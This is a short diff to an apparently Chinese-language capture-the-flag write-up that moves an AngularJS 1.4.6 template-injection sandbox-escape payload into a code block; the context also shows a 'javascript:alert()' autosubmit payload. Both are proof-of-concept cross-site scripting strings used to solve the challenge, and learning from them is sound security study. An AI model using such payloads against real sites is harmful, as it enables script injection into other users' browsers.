@@ -150,7 +150,13 @@ payload：`?action=javascript:alert()&autosubmit=1`
 
 只从做题的角度来看的话，找一下angular 1.4.6的payload，直接就打通了
 
-从https://juejin.cn/post/6891628594725847047#heading-8中，`?username={{x={y:''.constructor.prototype}; x.y.charAt=[].join; [1]|orderBy:'x=alert(1)}}'`，直接打通，flag到手啦
+从https://juejin.cn/post/6891628594725847047#heading-8中，payload
+
+```
+?username={{x={y:''.constructor.prototype}; x.y.charAt=[].join; [1]|orderBy:'x=alert(1)}}'
+```
+
+直接打通，flag到手啦
 
 然后我们来研究一下AngularJS的模板注入，主要看这篇文章https://juejin.cn/post/6891628594725847047#heading-8
 
